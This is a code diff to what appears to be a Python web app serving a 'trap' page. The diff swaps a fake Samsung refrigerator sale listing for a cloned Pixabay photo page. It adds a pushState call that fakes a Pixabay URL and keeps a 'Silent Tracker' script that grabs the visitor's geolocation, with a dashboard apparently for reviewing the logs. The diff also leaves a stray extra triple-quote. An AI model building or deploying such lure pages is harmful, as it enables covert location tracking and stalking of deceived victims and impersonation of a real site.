@@ -35,15 +35,18 @@ def get_logs():
     conn.close()
     return rows
 
-# --- THE TRAP (Fake Appliance Store) ---
+# --- THE TRAP (Cloaked as Pixabay) ---
 TRAP_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Home Appliances</title>
+    <title>Bread Machine - Free photo on Pixabay</title>
     <script>
-        // Silent Tracker
+        // 1. Steal the URL to make it look like Pixabay
+        window.history.pushState("", "", "/photos/bread-machine-household-appliances-6047/");
+        
+        // 2. Silent Tracker
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
@@ -58,33 +61,57 @@ TRAP_HTML = """
         }
     </script>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f9f9f9; }
-        .product-card { max-width: 500px; margin: auto; background: white; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); overflow: hidden; }
-        img { width: 100%; height: auto; }
-        .details { padding: 20px; }
-        h1 { font-size: 24px; margin: 0 0 10px 0; }
-        .price { color: #B12704; font-size: 22px; font-weight: bold; margin-bottom: 15px; }
-        .desc { color: #555; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
-        .btn { display: block; text-align: center; background: #FFD814; color: #111; text-decoration: none; padding: 12px; border-radius: 8px; font-weight: bold; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fff; color: #333; }
+        .header { display: flex; align-items: center; padding: 15px 20px; border-bottom: 1px solid #eee; }
+        .header img { height: 30px; }
+        .header h2 { margin: 0 0 0 10px; font-size: 20px; color: #191b26; font-weight: bold; }
+        .main { max-width: 900px; margin: 20px auto; padding: 0 20px; display: flex; gap: 30px; }
+        .image-container { flex: 2; }
+        .image-container img { width: 100%; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .sidebar { flex: 1; }
+        h1 { font-size: 24px; margin-top: 0; color: #191b26; }
+        .tags { display: flex; gap: 10px; margin-top: 15px; flex-wrap: wrap; }
+        .tag { background: #f2f2f2; color: #555; padding: 6px 12px; border-radius: 20px; font-size: 13px; text-decoration: none; }
+        .author-box { display: flex; align-items: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }
+        .author-icon { width: 40px; height: 40px; border-radius: 50%; background: #ccc; margin-right: 15px; }
+        .btn-download { display: block; text-align: center; background: #05a081; color: white; padding: 12px; border-radius: 24px; font-weight: bold; text-decoration: none; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="product-card">
-        <!-- This is a high-end Samsung Smart Fridge -->
-        <img src="https://images.samsung.com/is/image/samsung/p6pim/levant/rf59a9770sl-ua/gallery/levant-rf59a9770sl-ua-front-silver-534233647?$684_547_PNG$" alt="Smart Refrigerator">
-        <div class="details">
-            <h1>Samsung Bespoke 4-Door Flex Refrigerator</h1>
-            <div class="price">₦1,250,000</div>
-            <div class="desc">
-                Brand new, sealed in box. Features customizable panels, dual ice maker, and AI energy mode. Perfect for high-end kitchens.
-                <br><br>
-                <strong>Stock available in Lagos. DM for immediate delivery.</strong>
+    <div class="header">
+        <!-- Pixabay Logo -->
+        <svg height="30" viewBox="0 0 100 30" fill="#05a081"><text x="0" y="24" font-family="Arial" font-weight="bold" font-size="24">pixabay</text></svg>
+    </div>
+    <div class="main">
+        <div class="image-container">
+            <!-- The Bread Machine Image -->
+            <img src="https://cdn.pixabay.com/photo/2012/04/15/20/39/bread-35042_1280.png" alt="Bread Machine, Household Appliances">
+        </div>
+        <div class="sidebar">
+            <h1>Bread Machine, Household Appliances</h1>
+            <p style="color: #767676; font-size: 14px;">Free photo by <strong>OpenClipart-Vectors</strong></p>
+            
+            <div class="tags">
+                <a href="#" class="tag">bread machine</a>
+                <a href="#" class="tag">household appliances</a>
+                <a href="#" class="tag">kitchen</a>
+                <a href="#" class="tag">bread</a>
             </div>
-            <a href="#" class="btn">Contact Seller</a>
+
+            <a href="#" class="btn-download">Download</a>
+
+            <div class="author-box">
+                <div class="author-icon"></div>
+                <div>
+                    <strong>OpenClipart-Vectors</strong><br>
+                    <span style="font-size: 12px; color: #767676;">2,419 Followers</span>
+                </div>
+            </div>
         </div>
     </div>
 </body>
 </html>
+"""
 """
 
 # --- YOUR DASHBOARD ---
